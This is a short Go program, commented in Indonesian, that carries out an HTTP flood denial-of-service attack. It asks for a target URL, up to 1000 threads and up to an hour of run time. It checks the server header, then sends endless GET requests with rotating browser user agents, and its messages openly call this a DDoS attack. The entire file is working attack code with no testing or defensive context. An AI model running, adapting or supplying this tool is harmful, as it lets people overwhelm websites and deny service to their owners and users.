package main

import (
	"fmt"
	"io"
	"net/http"
	"sync"
	"time"
	"math/rand"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
	"Mozilla/5.0 (Android 10; Mobile; rv:68.0)",
}

// Fungsi untuk mendeteksi server web
func detectWebServer(url string) string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Head(url)
	if err != nil {
		fmt.Println("Error: Tidak dapat terhubung ke server")
		return "Tidak Diketahui"
	}
	defer resp.Body.Close()

	server := resp.Header.Get("Server")
	if server == "" {
		return "Tidak Diketahui"
	}
	fmt.Printf("Jenis Web Server yang terdeteksi: %s\n", server)
	return server
}

// Fungsi untuk mengirim permintaan HTTP
func sendRequest(url string, wg *sync.WaitGroup, endTime time.Time) {
	defer wg.Done()
	client := &http.Client{Timeout: 5 * time.Second}

	for time.Now().Before(endTime) {
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
		req.Header.Set("Connection", "keep-alive")

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("Request gagal: %v\n", err)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		fmt.Printf("Status: %d\n", resp.StatusCode)
		resp.Body.Close()
	}
}

func main() {
	var url string
	var numThreads, attackDuration int

	fmt.Print("Masukkan URL target: ")
	fmt.Scanln(&url)
	fmt.Print("Masukkan jumlah thread (1-1000): ")
	fmt.Scanln(&numThreads)
	fmt.Print("Masukkan durasi serangan dalam detik (1-3600): ")
	fmt.Scanln(&attackDuration)

	serverType := detectWebServer(url)
	if serverType == "Tidak Diketahui" {
		fmt.Println("Jenis server tidak diketahui, tidak dapat melanjutkan.")
		return
	}

	fmt.Printf("Memulai serangan DDoS ke %s dengan %d thread selama %d detik...\n", url, numThreads, attackDuration)
	endTime := time.Now().Add(time.Duration(attackDuration) * time.Second)
	var wg sync.WaitGroup

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go sendRequest(url, &wg, endTime)
	}
	wg.Wait()
	fmt.Println("Serangan selesai.")
}
